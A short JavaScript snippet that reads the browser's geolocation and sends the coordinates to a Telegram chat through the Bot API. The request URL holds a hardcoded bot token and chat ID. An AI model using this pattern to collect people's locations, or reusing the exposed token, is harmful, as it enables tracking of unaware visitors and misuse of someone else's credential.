function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        alert("Geolocation not supported.");
    }
}

function showPosition(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;

    var text = "Latitude: " + lat + ", Longitude: " + lon;

    var url =
        "https://api.telegram.org/bot8259403842:AAHhSOVYeuX8C9A5H-cYC_upkRc67kRbF-s/sendMessage?chat_id=7372882497&text=" +
        encodeURIComponent(text);

    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.send();

    alert("Location sent to Telegram!");
}

function showError(error) {
    alert("Error: " + error.message);
}
